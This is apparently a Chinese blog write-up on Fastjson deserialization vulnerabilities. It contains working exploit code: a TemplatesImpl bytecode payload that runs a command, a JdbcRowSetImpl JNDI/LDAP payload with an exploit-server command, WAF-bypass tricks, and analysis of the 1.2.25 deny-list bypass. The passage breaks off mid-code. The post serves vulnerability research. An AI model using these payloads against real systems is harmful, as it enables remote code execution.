</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonWithTemplatesImpl</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException, IOException &#123;  </span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();  </span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(test.class.getName());  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">randonClassName</span> <span class="operator">=</span> <span class="string">&quot;n4c1&quot;</span> + System.nanoTime();  </span><br><span class="line">        cc.setName(randonClassName);  </span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">byte</span>[] evilCode = cc.toBytecode();  </span><br><span class="line">            <span class="type">String</span> <span class="variable">evilCodeBase64</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(evilCode);  </span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">EVIL_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;\&quot;@type\&quot;:\&quot;&quot;</span> + EVIL_CLASS + <span class="string">&quot;\&quot;,&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;\&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + evilCodeBase64 + <span class="string">&quot;\&quot;],&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;&#x27;_name&#x27;:&#x27;a.b&#x27;,&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;&#x27;_tfactory&#x27;:&#123; &#125;,&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;&#x27;_outputProperties&#x27;:&#123; &#125;&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;&#125;\n&quot;</span>;  </span><br><span class="line">            System.out.println(payload);  </span><br><span class="line">            <span class="type">ParserConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();  </span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(payload, Object.class, config, Feature.SupportNonPublicField); <span class="comment">// 允许反序列化非公有属性  </span></span><br><span class="line">  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h4><p>通过调试源码, 可用大致梳理出json字符串解析流程<br>首先我们可以看见几个非常重要的类, 他们分别扮演了以下角色:</p><ul><li>json解析器(<code>json paser</code>)  ,对应 <code>com.alibaba.fastjson.parser.DefaultJSONParser</code>, </li><li>词法分析器(<code>lexer</code>), 主要作用是对各个token进行解析(即字符层面的识别), 通俗的说就是在一长串json字符串中定位出键与值.</li><li>反序列化器(<code>deserilizer</code>), 主要作用是反序列化出各个类, 不同的类对应不同的反序列化器, 由json解析器通过ParserConfig来获取. 对于一个JavaBean, 对应的反序列化器是<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer</code></li></ul><p>json解析器 (<code>DefaultJSONParser</code>)包装了词法分析器(<code>lexer</code>), 而反序列化器与json解析器在解析json字符串时互相依赖 (准确地说, json解析器负责解析出反序列化需要的数据, 反序列化器负责使用这些数据来还原出这个对象,  由于json是一个可以嵌套的结构, 因此这一过程往往是交错进行的)</p><p>可以去看一下DefaultJSONParser的属性如下图</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250527220313.png" alt="image.png"></p><p>反序列化器则定义在<code>ParserConfig</code>中<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250527220524.png" alt="image.png"></p><p>在本例中, 由于我们传入的基础类是<code>Object.class</code>, 当我们从<code>Object.class</code>开始, json解析器(<code>DefaultJSONParser</code>)拿到<code>Object.class</code>的反序列化器, 开始反序列化. 在此基础上, 开始解析json字符串, 这个工作由<code>DefaultJSONParser</code>发起. 由其包装的词法分析器(<code>lexer</code>)逐字读取并分析, 当词法分析器读到<code>@type</code>时,  发现需要反序列化出来一个类, 获取该类名称为 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>, 此时<code>DefaultJSONParser</code>获取该类的反序列化器(即<code>JavaBeanDeserializer</code>), 由此反序列化器进行反序列化. 初始化该反序列化器时会读取<code>JavaBean</code>的各种信息并保存起来, 包括<code>setter</code>, <code>Field</code>, <code>getter</code>, 很多师傅所说的对<code>getter</code>和<code>setter</code>方法的要求也就是在这一过程产生的.</p><p>拿到<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>的反序列化器后, 之后的过程交由<code>JavaBeanDeserializer</code>进行, 开始反序列化, 首先是使用默认的构造器创建一个<code>TemplatesImpl</code>的实例, 之后为其逐一添加属性, 此时词法分析器会扫描json字符串中<code>TemplatesImpl</code>类的字段(<code>Field</code>), 并进行添加, 此过程中<code>JavaBeanDeserializer</code>会获取并使用字段反序列化器(<code>FieldDeserializer</code>)来对字段的信息进行识别和反序列化(因为字段也可能是任何类型的对象),  <code>FieldDeserializer</code>会尝试调用<code>getter</code>和<code>setter</code>为对应的属性赋值, 本例中恶意字节码加载从此处开始触发, 当读到<code>_outputProperties</code>这个字段时,(这里json中的字符串虽然是<code>_outputProperties</code>, 但是会自动将其识别为<code>outputProperties</code>, 这个过程由smartMatch方法完成), 调用它的getter, 触发恶意类加载.<br>具体的getter和setter调用过程由FieldDeserializer的setValue方法执行,  &#x3D;&#x3D;当该字段有settter时直接调用setter而不调用getter, 无settter时调用getter&#x3D;&#x3D;尝试获取已经生成的对象中对应字段的引用, 并为其赋值</p><p>以上是我对反序列化过程的大致过程的理解, 这些解释是在调试的过程中得出的, 那么就从头来跟一下调试过程吧!</p><p>不必多说, 我们遇到的第一个关键步骤就是这里:<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250530154047.png" alt="image.png"></p><p>&#x3D;&#x3D;来到这一步时, 程序已经完成了:&#x3D;&#x3D;    通过输入的json字符串, 获取对应的json解析器(其中包含lexer), 通过初始类型(<code>Object.class</code>), 获取其反序列化器, 开始反序列化, this指针将当前的json解析器也传给了反序列化器, 因为反序列化的过程是需要解析json的</p><p>跟进 </p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250530154827.png" alt="image.png"></p><p>由于此时我们传入的是Object.class这样一个很宽泛的对象, fastjson首先判断其是否为一个泛型数组, 这是因为如果要反序列化出数组, 那么就可以直接可以将键值对插入到一个Array中, 而若只单单是一个Object.class, 其中不存在任何属性, 无法将得到的属性放进去, 需要后续使用fastjson自己实现的JSONObjcet这个类(一个map)来暂存. Serializable.class也是类似, 并不能实例化后向其中添加属性</p><p>继续跟进, 会走到这里<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250530165435.png" alt="image.png"><br>正如上面的解释, 此时实例了一个JSONObject<br>&#x3D;&#x3D;来到这一步时, 程序已经完成了:&#x3D;&#x3D;    <code>lexer</code>识别到第一个字符<code>&#123;</code>, 实例出JSONObject, 准备解析出json字符串中的数据往里面添加</p><p>继续跟进, 来到这一步<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250530170321.png" alt="image.png"><br>在这里,前面的过程大致就是判断了json格式的正确性, 以及使lexer的指针跳过多余但允许出现的符号(逗号, 注释)<br>&#x3D;&#x3D;来到这一步时, 程序已经完成了:&#x3D;&#x3D;   扫描出第一个key为<code>@type</code></p><p>继续往下看, lexer会扫描出类的名称, 之后json解析器加载这个类, 通过这个类获取对应的反序列化器, 进行反序列化<br>注意获取的反序列化<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250530172742.png" alt="image.png"><br>&#x3D;&#x3D;来到这一步时, 程序已经完成了:&#x3D;&#x3D;   拿到<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>的反序列化器, 这一过程中, 也已经拿到了字段反序列化器,其中包含了getter, setter 如上图.  师傅们可以自行调试查看过程, 为了不打断连贯性, 这个过程有空放在后面补充</p><p>继续跟进到这里<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531005754.png" alt="image.png"><br>这个方法的前面是对上下文信息和json格式的判断, 主要看这里的for循环, 先是对已经拿到的FieldDeserilizer进行遍历, 判断其操作的是否为一些基础类型,  当匹配到时, 标记<code>matchField = true;</code>跳过json字符串的扫描, 直接进入后面对属性赋值的过程,  从而使用特定的反序列化方式进而提升效率<br>这里我们的恶意类有以下三个字段反序列化器, 都不是特殊类型<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531011256.png" alt="image.png"></p><p>这个过程结束后, 就是逐个字段扫描并赋值, 当走到 key为_outputProperties时,<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531011753.png" alt="image.png"></p><p>拿到键名, 进行一些特殊键名的判断, 开始解析<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531012122.png" alt="image.png"></p><p>拿到_outputProperties字段的反序列化器, 开始反序列化字段<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531012257.png" alt="image.png"><br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531012345.png" alt="image.png"><br>跟进<br>通过&#x3D;&#x3D;FieldValue反序列化器&#x3D;&#x3D;拿到值后, setValue赋值<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531012635.png" alt="image.png"></p><p>跟进<br>触发getter<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531012807.png" alt="image.png"><br>如开篇总结所说_outputProperties是一个readonly属性(只有getter), fastjson会尝试调用它的getter获得内部map的引用来为其赋值</p><h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowSetImplPoc</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">PoC</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/ubjazx\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(PoC);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调试流程与上面一样, 只不过这里使用的是jndi<br>使用JNDI-Injection-Exploit起一个ldap服务即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;calc&quot; -A 127.0.0.1</span><br></pre></td></tr></table></figure><h3 id="绕过waf"><a href="#绕过waf" class="headerlink" title="绕过waf"></a>绕过waf</h3><p>在默认的<code>DefaultJSONParser</code>中有以下行为可能可以用来绕过waf<br>默认开启允许任意数量逗号</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250527155617.png" alt="image.png"></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250527155938.png" alt="image.png"><br>skipWhitespace()函数会调用skipComment(); 可以添加注释<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250527160630.png" alt="image.png"></p><p>添加注释<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250527160955.png" alt="image.png"></p><h2 id="fastjson-1-2-25-反序列化漏洞-对抗checkAutoType的开始"><a href="#fastjson-1-2-25-反序列化漏洞-对抗checkAutoType的开始" class="headerlink" title="fastjson 1.2.25 反序列化漏洞 对抗checkAutoType的开始"></a>fastjson 1.2.25 反序列化漏洞 对抗checkAutoType的开始</h2><h3 id="利用缓存绕过黑名单"><a href="#利用缓存绕过黑名单" class="headerlink" title="利用缓存绕过黑名单"></a>利用缓存绕过黑名单</h3><p>在此版本中, 上面的exp已经用不了了, 有以下报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">com.alibaba.fastjson.JSONException: autoType is not support. com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><br><span class="line">at com.alibaba.fastjson.parser.ParserConfig.checkAutoType(ParserConfig.java:844)</span><br><span class="line">at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:322)</span><br><span class="line">at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1327)</span><br><span class="line">at com.alibaba.fastjson.parser.deserializer.JavaObjectDeserializer.deserialze(JavaObjectDeserializer.java:45)</span><br><span class="line">at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:639)</span><br><span class="line">at com.alibaba.fastjson.JSON.parseObject(JSON.java:339)</span><br><span class="line">at com.alibaba.fastjson.JSON.parseObject(JSON.java:302)</span><br><span class="line">at FastjsonWithTemplatesImpl.main(FastjsonWithTemplatesImpl.java:41)</span><br></pre></td></tr></table></figure><p>autoType禁用了<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>这个类, 也就是<code>@type</code>不允许此类, 我们在报错位置打断点, 看看是哪里出问题了<br>可以看见断点在了下面这个位置<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531130503.png" alt="image.png"></p><p>这是在ParseConfig中的checkAutoType方法, 上面提到过ParseConfig有一个很重要的作用是用来存放反序列化器, 这里很明显更新后的版本又增加了对需要加载的类的类名的限制, 设置了一个黑名单, 以黑名单中起始的包名都将直接报错<br>具体黑名单如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0 = &quot;bsh&quot;</span><br><span class="line">1 = &quot;com.mchange&quot;</span><br><span class="line">2 = &quot;com.sun.&quot;</span><br><span class="line">3 = &quot;java.lang.Thread&quot;</span><br><span class="line">4 = &quot;java.net.Socket&quot;</span><br><span class="line">5 = &quot;java.rmi&quot;</span><br><span class="line">6 = &quot;javax.xml&quot;</span><br><span class="line">7 = &quot;org.apache.bcel&quot;</span><br><span class="line">8 = &quot;org.apache.commons.beanutils&quot;</span><br><span class="line">9 = &quot;org.apache.commons.collections.Transformer&quot;</span><br><span class="line">10 = &quot;org.apache.commons.collections.functors&quot;</span><br><span class="line">11 = &quot;org.apache.commons.collections4.comparators&quot;</span><br><span class="line">12 = &quot;org.apache.commons.fileupload&quot;</span><br><span class="line">13 = &quot;org.apache.myfaces.context.servlet&quot;</span><br><span class="line">14 = &quot;org.apache.tomcat&quot;</span><br><span class="line">15 = &quot;org.apache.wicket.util&quot;</span><br><span class="line">16 = &quot;org.codehaus.groovy.runtime&quot;</span><br><span class="line">17 = &quot;org.hibernate&quot;</span><br><span class="line">18 = &quot;org.jboss&quot;</span><br><span class="line">19 = &quot;org.mozilla.javascript&quot;</span><br><span class="line">20 = &quot;org.python.core&quot;</span><br><span class="line">21 = &quot;org.springframework&quot;</span><br></pre></td></tr></table></figure><p>我们往回调, 看看是从哪里调用到了checkAutoType<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531131011.png" alt="image.png"><br>如上图, 在json解析器parseObject中进行了调用, 在上个版本中, lexer扫描出类名后会直接loadClass, &#x3D;&#x3D;这个版本则是用ParseConfig.checkAutoType这个方法来加载类&#x3D;&#x3D;, 这个方法会对需要加载的类进行&#x3D;&#x3D;黑名单判断&#x3D;&#x3D;</p><p>这个黑名单涵盖的类算是非常多了, 直接找到一个可用的类比较困难, 我们先来看看checkAutoType是如何工作的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;  </span><br><span class="line">    <span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];  </span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;  </span><br><span class="line">                <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];  </span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;  </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);  </span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;  </span><br><span class="line">        clazz = deserializers.findClass(typeName);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> clazz;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];  </span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;  </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];  </span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;  </span><br><span class="line">                clazz = TypeUtils.loadClass(typeName, defaultClassLoader);  </span><br><span class="line">  </span><br><span class="line">                <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;  </span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());  </span><br><span class="line">                &#125;  </span><br><span class="line">                <span class="keyword">return</span> clazz;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;  </span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) <span class="comment">// classloader is danger  </span></span><br><span class="line">                || DataSource.class.isAssignableFrom(clazz) <span class="comment">// dataSource can load jdbc driver  </span></span><br><span class="line">                ) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;  </span><br><span class="line">                <span class="keyword">return</span> clazz;  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;  </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> clazz;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果开启了autoType (<code>autoTypeSupport == true</code>), fastjson会先校验白名单, 需要加载的类若在白名单中, 直接加载, 若不在则校验黑名单. 如果即不在白名单中也不在黑名单中, 则进入以下逻辑<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531141621.png" alt="image.png"></p><p>先从一个mapping中获取, 如何为空, 则从<code>deserializers</code>中获取, 如果也为空, 则进入到后面对于没开启autoType的判断逻辑, 我们暂且不看后面, 这里的mapping和deserializers显然是两个map, 是否可用向其中put进恶意的类呢?<br>先来看TypeUtils.getClassFromMapping的逻辑, 确实是从一个map中get而来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ConcurrentMap&lt;String, Class&lt;?&gt;&gt; mappings = <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;String, Class&lt;?&gt;&gt;(<span class="number">16</span>, <span class="number">0.75f</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531142914.png" alt="image.png"></p><p>全局查找mappings.put, 有以下几个地方是可能可控的<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531142755.png" alt="image.png"><br>后面三个都存在于TypeUtils.loadClass方法中, 代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;  </span><br><span class="line">    <span class="keyword">if</span> (className == <span class="literal">null</span> || className.length() == <span class="number">0</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    Class&lt;?&gt; clazz = mappings.get(className);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (clazz != <span 